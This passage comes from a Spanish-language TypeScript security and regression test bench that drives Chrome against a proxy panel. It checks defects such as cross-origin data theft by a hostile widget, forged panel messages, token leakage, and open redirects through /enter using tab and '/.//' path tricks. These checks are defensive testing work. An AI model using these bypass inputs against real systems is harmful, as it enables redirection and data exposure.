      return !!c['768'] && !!c['1366'];
    }, 4000);
    await espera(700); // y margen para ver si llegan cambios de más (el defecto H-8 eran tres)
    const chk = cuenta(/^chk:/, d);
    caso('CLI-2', '[H-8] clic en la etiqueta de una casilla: tres cambios en las seguidoras', (chk['768']?.length ?? 0) !== 1 || (chk['1366']?.length ?? 0) !== 1, `eventos change por celda: ${JSON.stringify(chk)}`);

    d = registro.length;
    await clic(s, 0, 40, 22);
    await espera(200);
    await teclea(s, 'abc');
    await espera(700);
    const ch = cuenta(/^change:/, d);
    const inp = cuenta(/^input:/, d);
    caso('ESC-1', '[H-7] al escribir, las seguidoras disparan «change» en cada tecla', (ch['768']?.length ?? 0) > 0, `change por celda: ${n(ch)}; input por celda: ${n(inp)}`);

    d = registro.length;
    await intro(s);
    await espera(900);
    const sub = cuenta('submit:f', d);
    const ch2 = cuenta(/^change:/, d);
    caso('ENV-1', '[H-4] Enter en un formulario con botón de envío: doble envío en las seguidoras', (sub['768']?.length ?? 0) !== 1 || (sub['393']?.length ?? 0) !== 1, `submit por celda: ${n(sub)}; change al confirmar: ${n(ch2)}`);

    // NUEVO: formularios en los que Enter NO envía en el navegador
    for (const [id, y, titulo] of [['f2', 170, 'formulario con dos campos y sin botón de envío (botón type=button): Enter no envía en el navegador'], ['f3', 220, 'formulario con el botón de envío deshabilitado (hasta que valide): Enter no envía en el navegador'], ['f4', 270, 'botón de envío fuera del formulario (atributo form=): el agente no lo ve como botón por defecto']] as const) {
      d = registro.length;
      await clic(s, 0, 40, y + 12);
      await espera(200);
      await intro(s);
      await espera(900);
      const sb = cuenta('submit:' + id, d);
      const lider = sb['393']?.length ?? 0;
      const seg = sb['768']?.length ?? 0;
      caso(`ENV-${id}`, `[NUEVO] ${titulo}`, seg !== lider, `submit en la celda del usuario: ${lider}; en cada seguidora: ${seg} (${n(sb)})`);
    }

    const alHost = await evalua<{ t: string }[]>(s, 'window.__alHost');
    console.log(`\n[HOST] mensajes del panel al host en modo producto: tipos=${JSON.stringify([...new Set(alHost.map((m) => m.t))])}; ¿aparece lo tecleado («abc»)? ${JSON.stringify(alHost).includes('abc')}`);
    // H-14: el host pregunta «metrics» a una celda en modo producto y la respuesta tiene que volver.
    const hm = haciaHost.length;
    await evalua(s, `window.postMessage({ t: 'toCell', cell: 'c', cmd: { t: 'ask', id: 77, q: 'metrics' } }, location.origin)`);
    await hasta(() => haciaHost.slice(hm).some((x) => x.m.t === 'answer'), 2500);
    const resp = haciaHost.slice(hm).find((x) => x.m.t === 'answer')?.m;
    caso('MET-1', '[H-14] ask("metrics") nunca recibe respuesta fuera del modo sonda', !resp, `respuesta que llega al host: ${JSON.stringify(resp)}`);

    // ══════════ H-3: dos mosaicos a la vez (misma app y otra app)
    const antes = peticiones.filter((p) => p.startsWith('app1 GET /form')).length;
    const d2 = registro.length;
    await pestana(`${panel.origin}/?e=mismaApp`);
    await pestana(`${panel.origin}/?e=otraApp`);
    await hasta(() => registro.slice(d2).filter((r) => r.ev.startsWith('cargada:/form')).length >= 2);
    await espera(300);
    await evalua(s, `window.postMessage({ t: 'reload' }, location.origin)`);
    await espera(1500);
    const despues = peticiones.filter((p) => p.startsWith('app1 GET /form')).length;
    // antes → +1 (segundo mosaico de la misma app) +3 (recarga del primero)
    caso('COK-1b', '[H-3] abrir un segundo mosaico deja al primero sin acceso', despues - antes < 4, `peticiones de /form a la app 1 tras abrir otro mosaico de la misma app (1) y recargar las 3 celdas del primero (3): ${despues - antes} de 4`);
  }

  // ══════════ Escena «spa»
  {
    const s = await pestana(`${panel.origin}/?e=spa`);
    let d = registro.length;
    await cargadas('/spa', d, 3);
    await espera(500);
    const h0 = haciaHost.length;
    d = registro.length;
    await clic(s, 0, 60, 215);
    await espera(700);
    const bot = cuenta(/^boton:/, d);
    const miss = haciaHost.slice(h0).filter((x) => x.m.t === 'miss').length;
    caso('CLI-3', '[H-6] DOM distinto según el ancho: el clic del móvil pulsa OTRO botón en otra celda', Object.entries(bot).some(([w, v]) => w !== '393' && v.some((x) => x !== 'boton:Menu')), `botón ejecutado por celda: ${JSON.stringify(bot)}; avisos «miss» al host: ${miss}`);

    d = registro.length;
    await evalua(s, 'window.__msgs.length = 0');
    const r = await evalua<{ l: number; t: number }>(s, `(function(){var b=document.querySelectorAll('iframe')[0].getBoundingClientRect();return {l:b.left,t:b.top};})()`);
    for (let i = 0; i < 5; i++) {
      await cdp('Input.dispatchMouseEvent', { type: 'mouseWheel', x: r.l + 150, y: r.t + 400, deltaX: 0, deltaY: 200 }, s);
      await espera(60);
    }
    await espera(1500);
    const m1 = await evalua<string[]>(s, 'window.__msgs.slice()');
    await espera(1200);
    const m2 = await evalua<string[]>(s, 'window.__msgs.slice()');
    const porCelda = (ms: string[]): Record<string, number> => {
      const o: Record<string, number> = {};
      for (const x of ms) if (x.endsWith(':scroll')) o[x] = (o[x] ?? 0) + 1;
      return o;
    };
    console.log(`\n[SCR-1] (comprobación) scroll con la rueda en la celda 0: mensajes scroll por celda=${JSON.stringify(porCelda(m1))}; 1,2 s después=${JSON.stringify(porCelda(m2))}; posición final por celda=${JSON.stringify(cuenta(/^ry:/, d))}`);

    await cdp('Input.dispatchMouseEvent', { type: 'mouseWheel', x: r.l + 150, y: r.t + 400, deltaX: 0, deltaY: -5000 }, s);
    await espera(1200);
    d = registro.length;
    for (let i = 0; i < 5; i++) {
      await clic(s, 0, 60, 30);
      await espera(1700); // por debajo del cortacircuitos (más de 6 en 10 s)
    }
    await espera(800);
    const recargas = cuenta(/^cargada:\/spa/, d);
    const empujes = cuenta(/^push:/, d);
    caso('NAV-6', '(riesgo de la 1.ª pasada) SPA con pushState tras cargar datos: la orden nav recarga la página entera en las seguidoras', Object.values(recargas).some((v) => v.length > 0), `recargas completas tras 5 clics: ${n(recargas)}; pushState propios: ${n(empujes)}`);

    // Cortacircuitos en el navegador: 8 clics seguidos en «Siguiente», uno cada 600 ms.
    d = registro.length;
    const h1 = haciaHost.length;
    for (let i = 0; i < 8; i++) {
      await clic(s, 0, 60, 30);
      await espera(600);
    }
    await espera(800);
    const salto = haciaHost.slice(h1).some((x) => x.m.t === 'trip');
    const aviso = await evalua<boolean>(s, `!!document.querySelector('.aviso')`);
    // «Reload to resume»: el comando Reload del host manda {t:'reload'} al panel.
    await evalua(s, `window.postMessage({ t: 'reload' }, location.origin)`);
    await cargadas('/spa', registro.length, 3);
    await espera(1500);
    const sigueAviso = await evalua<boolean>(s, `!!document.querySelector('.aviso')`);
    // ¿Se rearmó? Un clic más del usuario en «Siguiente»: si la navegación se repartiera, el panel mandaría «nav» a las otras.
    const hTrip = haciaHost.length;
    void hTrip;
    caso('COR-1b', '[NUEVO] en Chrome: 8 clics seguidos en «Siguiente» (uno cada 0,6 s) hacen saltar el cortacircuitos', salto && aviso, `mensaje trip al host: ${salto}; aviso en pantalla: ${aviso}`);
    caso('COR-2b', '[NUEVO] en Chrome: tras «Reload» (lo que el aviso pide) el aviso sigue y la fila no se rearma', sigueAviso, `aviso en pantalla tras recargar las celdas: ${sigueAviso}`);
  }

  // ══════════ Documento sin <head>
  {
    const d = registro.length;
    await pestana(`${panel.origin}/?e=quirks`);
    await cargadas('/sinhead', d, 1);
    const enCelda = registro.slice(d).find((r) => r.ev.startsWith('cargada:/sinhead'))?.ev ?? '(no cargó)';
    caso('INY-1b', '[H-10] un documento sin <head> se pinta en modo quirks dentro de la celda', !enCelda.endsWith('CSS1Compat'), `document.compatMode en la celda: ${enCelda.split(':').pop()}`);
  }

  // ══════════ H-1: widget de terceros dentro de la app, y página ajena de primer nivel en el mismo navegador
  {
    const p0 = peticiones.length;
    await pestana(`${panel.origin}/?e=widget`);
    await hasta(() => robado.length >= 1, 9000);
    await pestana(`${malo.origin}/widget-top?o=${encodeURIComponent(px.originFor('main'))}`);
    await hasta(() => robado.length >= 2, 9000);
    await espera(500);
    const todo = robado.join('\n');
    const leido = /sk-de-desarrollo|IBAN|SESION-DE-ANA|LEIDO/.test(todo);
    const oido = robado.map((r) => (JSON.parse(r) as { oido: unknown[] }).oido.length);
    caso('AGE-1', '[H-1] un origen ajeno (widget dentro de la app, o página de primer nivel) lee la app a través del agente', leido, `informes recibidos por el servidor ajeno: ${robado.length}; mensajes del agente que oyó: ${JSON.stringify(oido)}; ¿algún dato de la app? ${leido}`);
    for (const r of robado) nota(`pasos del atacante: ${JSON.stringify((JSON.parse(r) as { pasos: string[] }).pasos)}`);
    const tras = peticiones.slice(p0);
    const llegaron = tras.filter((p) => /cruzada|orden-nav/.test(p));
    caso('AGE-2', '[H-1] un origen ajeno manda órdenes a la celda o peticiones con la sesión del usuario', llegaron.length > 0, `peticiones «cruzadas» u órdenes que llegaron a la app: ${JSON.stringify(llegaron)}`);
    nota(`lo que sí llega a la app desde el atacante: ${JSON.stringify([...new Set(tras.filter((p) => /perfil|privado/.test(p)))])} (GET de iframe con la sesión: la página se pinta en su marco, pero no puede leerla)`);
  }

  // ══════════ H-2: bucle entre sesiones
  {
    const s = await pestana(`${panel.origin}/?e=bucle`);
    const d = registro.length;
    await cargadas('/inicio', d, 2);
    await espera(500);
    const n0 = peticiones.length;
    await clic(s, 0, 60, 30);
    await espera(4000);
    const tras = peticiones.slice(n0);
    const cont: Record<string, number> = {};
    for (const p of tras) cont[p.replace(' [con sid]', '')] = (cont[p.replace(' [con sid]', '')] ?? 0) + 1;
    await espera(1000);
    const sigue = peticiones.length - n0 - tras.length;
    const rutas = await evalua<string[]>(s, `[...document.querySelectorAll('.ruta')].map(function (x) { return x.textContent.trim(); })`);
    caso('NAV-1b', '[H-2] admin e invitado en el mismo grupo: las celdas se mandan a navegar sin parar', tras.length > 12 || sigue > 0, `peticiones en 4 s tras UN clic: ${tras.length} ${JSON.stringify(cont)}; en el segundo siguiente: ${sigue}; rutas finales (admin, invitado): ${JSON.stringify(rutas)}`);
    await cdp('Page.navigate', { url: 'about:blank' }, s);
  }

  // ══════════ crossSiteAllowed: lo legítimo dentro de la celda
  {
    const d = registro.length;
    await pestana(`${panel.origin}/?e=legit`);
    await hasta(() => registro.slice(d).filter((r) => r.ev.startsWith('legit:')).length >= 3, 9000);
    console.log('\n[CRZ-2] lo que la app hace consigo misma dentro de la celda (Chrome real)');
    for (const r of registro.slice(d).filter((x) => x.ev.startsWith('legit:'))) nota(r.ev.slice(6));
    const man = peticiones.filter((p) => p.includes('/manifest.json')).length;
    nota(`<link rel="manifest"> (el navegador lo pide sin cookies): peticiones que llegaron a la app = ${man}`);
    const l = registro.slice(d).find((x) => x.ev.startsWith('legit:fetch'))?.ev ?? '';
    caso('CRZ-3', '[NUEVO en esta pasada, ya estaba en la 1.ª] una petición de la propia app SIN credenciales (fetch credentials:"omit", manifest) recibe 403: la puerta es una cookie', /sin credenciales=403/.test(l), l.slice(6, 200));
    caso('CRZ-4', '[NUEVO] un iframe sandbox de la propia app (sin allow-same-origin: vista previa de correo, editor) ya no puede cargar recursos de la app', /sandbox de la propia app=error/.test(l), 'su origen es opaco → Sec-Fetch-Site: cross-site → 403');
  }
  // ══════════ crossSiteAllowed: una sesión contra otra
  {
    const p0 = peticiones.length;
    const d = registro.length;
    await pestana(`${panel.origin}/?e=entre`);
    await cargadas('/entre', d, 1);
    await espera(1500);
    const llegaron = peticiones.slice(p0).filter((p) => p.includes('/sesion-'));
    caso('CRZ-5', '[H-1] la celda de una sesión lanza peticiones (fetch, imagen, formulario POST) contra el origen de otra sesión', llegaron.length > 0, `peticiones que llegaron a la app con la sesión de la otra celda: ${JSON.stringify(llegaron)}`);
  }

  // ══════════ Paso de API y parche de fetch/XHR
  {
    const d = registro.length;
    const a0 = apiVistas.length;
    await pestana(`${panel.origin}/?e=api`);
    await hasta(() => registro.slice(d).filter((r) => r.ev.startsWith('api-celda:')).length >= 9, 9000);
    console.log('\n[API-5] llamadas a la API de otro puerto desde la celda, con el parche de fetch/XHR (Chrome real)');
    const lineas = registro.slice(d).filter((x) => x.ev.startsWith('api-celda:')).map((x) => x.ev.slice(10));
    for (const l of lineas) nota(l);
    nota(`lo que vio la API: ${JSON.stringify(apiVistas.slice(a0))}`);
    const c = lineas.find((l) => l.startsWith('c ')) ?? '';
    const i = lineas.find((l) => l.startsWith('i ')) ?? '';
    caso('API-6', '[NUEVO] fetch(new Request(url, {method:"POST", body})) hacia la API falla con el parche (ky, openapi-fetch y otros clientes llaman así)', !/=200 .*cuerpo-en-request/.test(c), `${c} | ${i}`);
    const g = lineas.find((l) => l.startsWith('g ')) ?? '';
    caso('API-2b', '[NUEVO] en Chrome: la API redirige (barra final) y la llamada sale del paso', !/=200/.test(g), g);
    // La misma página en la captura: pestaña de primer nivel, donde el agente no hace nada (window.top === window).
    const d2 = registro.length;
    const a1 = apiVistas.length;
    await pestana(px.captureUrl('main', `/apitest?api=${encodeURIComponent(api.origin)}`));
    await hasta(() => registro.slice(d2).filter((r) => r.ev.startsWith('api-captura:')).length >= 9, 9000);
    const cap = registro.slice(d2).filter((x) => x.ev.startsWith('api-captura:')).map((x) => x.ev.slice(12));
    const okCap = cap.filter((l) => /^[a-f] .*=200/.test(l)).length;
    const okCel = lineas.filter((l) => /^[a-f] .*=200/.test(l)).length;
    caso('API-7', '[NUEVO] en la captura el parche no existe (el agente se retira en primer nivel): la app fotografiada no puede llamar a su API', okCap < okCel, `llamadas a la API con éxito (a–f): en la celda ${okCel}, en la captura ${okCap}. Ejemplo en la captura: ${cap[0] ?? '(sin datos)'}`);
    nota(`lo que vio la API desde la captura: ${JSON.stringify(apiVistas.slice(a1))}`);
  }

  // ══════════ Huella con idiomas distintos
  {
    const s = await pestana(`${panel.origin}/?e=idioma`);
    let d = registro.length;
    await cargadas('/idioma', d, 2);
    await espera(500);
    const h0 = haciaHost.length;
    d = registro.length;
    await clic(s, 0, 60, 30);
    await espera(600);
    await clic(s, 0, 60, 82);
    await espera(200);
    await teclea(s, 'ab');
    await espera(600);
    const cl = cuenta(/^idioma-clic:/, d);
    const es = cuenta(/^idioma-escrito:/, d);
    caso('HUE-1', '[NUEVO] celdas con idiomas distintos (la función «locale»): la huella incluye el texto y el aria-label, así que ni el clic ni la escritura se reproducen', !cl['768'] && !es['768'], `clic por celda: ${JSON.stringify(cl)}; escritura por celda: ${n(es)}; avisos «miss»: ${haciaHost.slice(h0).filter((x) => x.m.t === 'miss').length}`);
  }

  // ══════════ Mensajes fabricados por la página
  {
    const h0 = haciaHost.length;
    await pestana(`${panel.origin}/?e=forja`);
    await espera(1500);
    const mios = haciaHost.slice(h0).filter((x) => x.e === 'forja').map((x) => x.m);
    const hints = mios.filter((m) => m.t === 'hint').map((m) => m.origin);
    caso('FOR-1', '[NUEVO] cualquier script de la página puede hacer que el host ofrezca «pasar por ViewKeeper» un puerto local a su elección', hints.includes('http://localhost:9222'), `avisos hint que el panel reenvía al host: ${JSON.stringify(hints)} (commands.ts los convierte en una pregunta Sí/No y, con Sí, en apiOrigins del área de trabajo)`);
    nota(`respuesta «answer» fabricada, tal como llega al host: ${JSON.stringify(mios.find((m) => m.t === 'answer'))}`);
  }

  // ══════════ Salir del origen del proxy
  {
    await pestana(`${panel.origin}/?e=fuera`);
    await espera(2000);
    console.log(`\n[CSP-1] (comprobación) una celda que navega a otro origen: ¿llega? ${aterrizajes.some((a) => a.includes('desde-celda'))}`);
    const h = malo.origin.slice(7);
    await pestana(`${px.originFor('main')}${PREFIX}/enter?t=${px.token}&to=${encodeURIComponent('/\t/' + h + '/aterrizaje-por-tab')}`);
    await espera(1200);
    caso('ENT-1b', '[H-11] en Chrome: /enter con to="/<TAB>/host" lleva a otro servidor', aterrizajes.some((a) => a.includes('por-tab')), `aterrizajes: ${JSON.stringify(aterrizajes)}`);
    await pestana(`${px.originFor('main')}${PREFIX}/enter?t=${px.token}&to=${encodeURIComponent('/.//' + h + '/aterrizaje-por-punto')}`);
    await espera(1200);
    caso('ENT-4b', '[NUEVO] en Chrome: /enter con to="/.//host" lleva a otro servidor (una pasada de safeLocalPath)', aterrizajes.some((a) => a.includes('por-punto')), `aterrizajes: ${JSON.stringify(aterrizajes)}`);
    await pestana(px.captureUrl('main', '/.//' + h + '/aterrizaje-por-captura'));
    await espera(1200);
    nota(`por captureUrl (dos pasadas) ¿sale? ${aterrizajes.some((a) => a.includes('por-captura'))}`);
  }

  // ══════════ ¿Se escapa el token?
  {
    const vistos = registro.filter((r) => r.ev.startsWith('visible-para-la-pagina:'));
    const fuga = vistos.filter((r) => secretos.some((t) => r.ev.includes(t)));
    console.log(`\n[TOK-1] (comprobación) el token o una cookie ${GATE_PREFIX}* en lo que ve el servidor del usuario: ${tokenEnServidor.length} peticiones de ${peticiones.length}; en lo que ve el JavaScript de la página: ${fuga.length} de ${vistos.length} cargas`);
    nota(`ejemplo de lo que ve la página: ${vistos[0]?.ev.slice(0, 230)}`);
    if (tokenEnServidor.length) nota(`peticiones con el token: ${JSON.stringify(tokenEnServidor.slice(0, 5))}`);
  }
} catch (e) {
  console.log(`\nERROR del montaje: ${(e as Error).message}`);
  // Un montaje que no arranca no es un banco en verde.
  caso('MONTAJE', 'el banco no pudo montar el panel', true, (e as Error).message);
} finally {
  try {
    await Promise.race([cdp('Browser.close'), espera(2000)]);
  } catch {
    /* ya cerrado */
  }
  await espera(500);
  if (chrome.exitCode === null) chrome.kill(); // por PID, solo el proceso que lanzó este guion
  ws.terminate();
  for (const x of [px, pxb, px2, up, up2, malo, panel, api]) await x.close();
  await espera(500);
  try {
    fs.rmSync(perfil, { recursive: true, force: true });
  } catch {
    /* Windows suelta los ficheros con retraso */
  }
}
process.exit(resultado());
